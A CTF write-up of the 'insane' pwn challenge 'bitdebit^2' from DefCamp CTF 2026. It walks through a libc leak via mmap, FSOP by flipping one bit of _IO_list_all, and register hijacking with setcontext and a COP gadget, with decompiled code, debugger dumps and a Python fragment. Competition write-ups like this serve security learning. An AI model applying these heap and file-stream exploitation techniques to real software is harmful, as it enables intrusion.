# DefCamp CTF 2026
<primary-label ref="pwn"/>

Hello, I participated DefCamp CTF 2026 and solved all pwn challenges.

In D-CTF, all AI usages were banned, including slopping the challenges locally.

I'd like to introduce the solution of `bitdebit^2`, which was labeled "insane" of its difficulty.

Only 16 teams solved this challenge, and I won the first blood during the competition.

Our team:`z0mblmblo` ranked 45 in the competition, which is very close to qualify the finals.

![Screenshot_20260921_013455.png](Screenshot_20260921_013455.png)

![Screenshot_20260921_013549.png](Screenshot_20260921_013549.png)

## Overview

The challenge was very simple:

```c
00401200    int32_t main(int32_t argc, char** argv, char** envp)

0040122d        void* fsbase
0040122d        int64_t rax = *(fsbase + 0x28)
00401240        setvbuf(fp: stdin, buf: nullptr, mode: 2, size: 0)
00401255        setvbuf(fp: stdout, buf: nullptr, mode: 2, size: 0)
0040126a        setvbuf(fp: stderr, buf: nullptr, mode: 2, size: 0)
00401272        puts(str: "gib")
0040127f        uint64_t bytes
0040127f        __isoc99_scanf(format: "%lu", &bytes)
00401288        int64_t rax_3 = malloc(bytes)
004012a1        __printf_chk(flag: 1, format: "%p\n", rax_3)
004012ad        fflush(fp: stdout)
004012b5        puts(str: "gib")
004012c4        int64_t var_110
004012c4        __isoc99_scanf(format: "%lu", &var_110)
004012c4        
004012d2        if (var_110 u>= bytes)
00401480            syscall(0xe7, 1)
004012d2        else
004012df            puts(str: "Whats your name challenger?")
004012e4            int64_t rax_7 = var_110
004012fb            read(fd: 0, buf: rax_3 + rax_7, nbytes: bytes - rax_7)
00401307            getc(fp: stdin)
00401313            puts(str: "Last time you had 1 bit, now you're getting 1")
0040131f            puts(str: "first addr")
0040133b            char var_a8[0x88]
0040133b            
0040133b            if (fgets(buf: &var_a8, n: 0x80, fp: stdin) == 0)
0040145b            label_40145b:
0040145b                *(fsbase + 0x28)
0040145b                
00401464                if (rax == *(fsbase + 0x28))
00401473                    return 0
0040133b            else
00401348                uint64_t rax_9 = strtoull(nptr: &var_a8, endptr: nullptr, base: 0)
00401357                puts(str: "first bit")
00401357                
00401373                if (fgets(buf: &var_a8, n: 0x80, fp: stdin) == 0)
00401373                    goto label_40145b
00401373                
00401380                int32_t rax_11 = strtoul(nptr: &var_a8, endptr: nullptr, base: 0)
00401380                
0040138b                if (rax_11 u> 7)
0040138b                    goto label_40145b
0040138b                
004013a2                *rax_9 ^= (1 << (rax_11.b & 0x1f)).b
004013a2                
004013b5                if (prctl(option: 0x26, 1, 0, 0, 0) != 0)
00401480                    syscall(0xe7, 1)
004013b5                else
0040142e                    int64_t var_f8
0040142e                    int64_t* var_100_1 = &var_f8
00401435                    __builtin_memcpy(dest: &var_f8, 
00401435                        src: "\x20\x00\x00\x00\x00\x00\x00\x00\x35\x00\x00\x02\x00\x00\x00\x40\x"
00401435                    "15\x00\x01\x00\xff\xff\xff\xff\x06\x00\x00\x00\x00\x00\x00\x80\x15\x00"
00401435                    "00\x01\x09\x00\x00\x00\x06\x00\x00\x00\x00\x00\xff\x7f\x15\x00\x00\x01"
00401435                    "27\x01\x00\x00\x06\x00\x00\x00\x00\x00\xff\x7f\x06\x00\x00\x00\x00\x00"
00401435                    "00\x80", 
00401435                        count: 0x48)
00401443                    int16_t var_108 = 9
00401443                    
00401451                    if (prctl(option: 0x16, 2, &var_108, 0x12701000015) == 0)
00401451                        goto label_40145b
00401451                    
00401480                    syscall(0xe7, 1)
00401480        
00401485        __stack_chk_fail()
00401485        noreturn
```
Ofc all mitigations were enabled.
```plain text
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## Primitive

We can do malloc with arbitrary size. Then the chal teach us the pointer where malloc allocated.

Next, we can specify the offset where we start writing with `read(0,ptr+offset,alloc_size-offset)`

Finally, we can specify arbitrary address and bit to flip with xor.

## Mitigations

Before the chal ends, it sets seccomp with `prctl` which only allows `mmap`, `preadv`, and 32-bit `openat`.

ida is much more clear to see the argument of prctl.

Looking back before AI era, I always used both ida and binary ninja during the live CTF. That was something enjoyable to see each characteristic.
However, LLM became much smarter decompiler in now days.
It is very good that people do not have to do rev on pwn, but I feel something lonely.... :cry:

```c
        if ( prctl(option: 38, 1, 0, 0, 0) != 0 )
          goto LABEL_8;
        v11[1] = 0x4000000002000035LL;
        v11[2] = -4294901739LL;
        v11[3] = 0x8000000000000006LL;
        v11[8] = 0x8000000000000006LL;
        v11[4] = 0x901000015LL;
        v11[5] = 0x7FFF000000000006LL;
        v11[7] = 0x7FFF000000000006LL;
        v10 = v11;
        v11[0] = 32;
        v11[6] = 0x12701000015LL;
        v9 = 9;
        if ( prctl(option: 22, 2, &v9) != 0 )
LABEL_8:
          syscall(sysno: 231, 1);
```

## Solution

### Step 1, leak the libc

Ofc many people know that malloc uses mmap when it allocates very large memory.

![Screenshot_20260921_021951.png](Screenshot_20260921_021951.png)

Fortunately, mmap allocated immediately below the libc in local. (there was 0x3000 diff on socat/remote)

### Step 2, FSOP with _IO_list_all

For now, we have a large heap immediately below libc.
FSOP with `_IO_list_all` is the best way to control rip and rdi with only one bit writing.

```Plain Text
[fastDbg:0x7f4aa971ba91]$ p $_IO_list_all
HEX: 0x7f4aa98044c0 DEC: 139958648063168 OCT: 3764525140042300 BIN: 11111110100101010101001100000000100010011000000
[fastDbg:0x7f4aa971ba91]$ dq $_IO_list_all
00007f4aa98044c0: 0x00007f4aa98044e0 0x0000000000000000  |.D..J...........|
00007f4aa98044d0: 0x0000000000000000 0x0000000000000000  |................|
00007f4aa98044e0: 0x00000000fbad2087 0x00007f4aa9804563  |. ......cE..J...|
00007f4aa98044f0: 0x00007f4aa9804563 0x00007f4aa9804563  |cE..J...cE..J...|
[fastDbg:0x7f4aa971ba91]$ p $_IO_2_1_stderr_
HEX: 0x7f4aa98044e0 DEC: 139958648063200 OCT: 3764525140042340 BIN: 11111110100101010101001100000000100010011100000
```

before
```plain text
[fastDbg:0x7f4aa971ba91]$ dq $_IO_list_all
00007f4aa98044c0: 0x00007f4aa98044e0 0x0000000000000000  |.D..J...........|
                          |
             --------------
             |    [fastDbg:0x7f4aa971ba91]$ dq $_IO_2_1_stderr_
             ---->00007f4aa980  44e0: 0x00000000fbad2087 0x00007f4aa9804563  |. ......cE..J...|
                  00007f4aa980  44f0: 0x00007f4aa9804563 0x00007f4aa9804563  |cE..J...cE..J...|
                  00007f4aa980  4500: 0x00007f4aa9804563 0x00007f4aa9804563  |cE..J...cE..J...|
                  00007f4aa980  4510: 0x00007f4aa9804563 0x00007f4aa9804563  |cE..J...cE..J...|
                  
00007f4aa98044d0: 0x0000000000000000 0x0000000000000000  |................|
00007f4aa98044e0: 0x00000000fbad2087 0x00007f4aa9804563  |. ......cE..J...|
00007f4aa98044f0: 0x00007f4aa9804563 0x00007f4aa9804563  |cE..J...cE..J...|
```

after
```plain text
[fastDbg:0x7f4aa971ba91]$ dq $_IO_list_all
00007f4aa98044c0: 0x00007f4aa94044e0 0x0000000000000000  |.D..J...........|
                          |
             --------------
             |    
             ----> fake FILE
                  
00007f4aa98044d0: 0x0000000000000000 0x0000000000000000  |................|
00007f4aa98044e0: 0x00000000fbad2087 0x00007f4aa9804563  |. ......cE..J...|
00007f4aa98044f0: 0x00007f4aa9804563 0x00007f4aa9804563  |cE..J...cE..J...|
```

e.g.,
```py
stderr = libc.sym["_IO_2_1_stderr_"]
hl(stderr)

fake=0
bit=0
for i in range(22, 64):
    if not (stderr & (1 << i)):
        continue
    _fake = stderr ^ (1 << i)
    off = _fake - obj

    if 0 <= off and off + 0x600 <= 0x8000000:
        fake = _fake
        bit = i
        break
```

### Step 3. full control with `setcontext`

`setcontext` is minor but very strong to hijack all registers with rip and rdi control.

due to the seccomp, we have to earn more strong primitive, such as rop or shellcode execution.

In setcontext, I used COP gadget that is a part of vtable execution.

```Py
gef> x/5i $libc+0x176f3e
   0x7fd4d0b76f3e <__rpc_thread_key_cleanup+46>:        mov    rdx,QWORD PTR [rax+0x38]
   0x7fd4d0b76f42 <__rpc_thread_key_cleanup+50>:        mov    rdi,rax
   0x7fd4d0b76f45 <__rpc_thread_key_cleanup+53>:        call   QWORD PTR [rdx+0x20]
```

This gadget is very useful. Another example, I used this gadget to get RCE on ladybird browser: [](Exploiting-the-LadyBird-Browser.md)

